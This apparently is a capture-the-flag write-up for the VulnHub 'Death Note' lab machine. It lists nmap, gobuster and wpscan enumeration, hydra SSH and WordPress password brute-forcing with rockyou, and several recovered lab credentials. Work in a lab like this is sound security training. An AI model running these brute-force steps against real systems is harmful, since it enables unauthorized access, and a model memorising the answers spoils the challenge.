# Author: Panagiotis Fiskilis/Neuro #

## Challenge name: VulnHub:Death Note ##

Link: <code>https://www.vulnhub.com/entry/deathnote-1,739/</code>

### Host Discovery ###

```bash
nmap -sP 192.168.1.* |grep -i "deathnote"
```

<b>Machine IP: 192.168.1.60</b>

<b>My IP: 192.168.1.2</b>

### Enumeration: ###

```bash
nmap -sV -sC 192.168.1.60 |tee nmap.init
nmap -p- 192.168.1.60 |tee all_ports.log
hydra -L /opt/1337/usernames.txt -P /opt/1337/rockyou.txt ssh://192.168.1.60
gobuster dir -u "http://deathnote.vuln/wordpress/" -w /opt/1337/directory-list-2.3-medium.txt |tee gobuster.log
wpscan -e ap --url "http://deathnote.vuln/wordpress/" -U /opt/1337/usernames.txt -P /opt/1337/rockyou.txt |wpscan.log
wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt
```

<i>Nmap Results:</i>

|Port|Service|
| --- | --- |
|22 |ssh|
|80|http|

The machine is a Linux/Debian machine, that hosts a wordpress website

We have a password: <code>iamjustic3</code>

From guessing and Deathnote(the best anime ever) we know the user:kira

<b>Foothold</b>

```bash
hydra -l l -P ./notes.txt ssh://192.168.1.60
ssh l@192.168.1.60
```

l:death4me

```bash
cd /opt/L
cd fake-notebook-rule
cat case.wav
```

kira:kiraisevil

Kira is root
